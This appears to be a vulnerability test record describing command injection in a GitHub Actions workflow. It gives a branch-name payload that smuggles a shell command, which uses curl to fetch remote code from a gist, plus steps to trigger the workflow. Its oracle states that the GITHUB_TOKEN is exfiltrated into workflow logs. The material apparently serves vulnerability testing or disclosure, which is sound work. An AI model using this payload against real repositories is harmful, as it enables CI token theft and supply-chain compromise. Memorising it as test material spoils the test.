title: Command injection in GitHub Actions workflow due to unsafe evaluation of expressions in shell scripts
trigger_payload:
Fork the mirror and create a new branch with the following name: ";$(curl${IFS}-L${IFS}gist.githubusercontent.com/nikitastupin/30e525b776c409e03
In the created branch in .github/workflows create trigger.yml with content:
name: Hello World
on: [push]
jobs:
build:
runs-on: ubuntu-latest
steps:
- name: Hello world step
run: echo "Hello, World"
oracle: The GITHUB_TOKEN is exfiltrated and visible in the workflow logs after the malicious branch is merged.
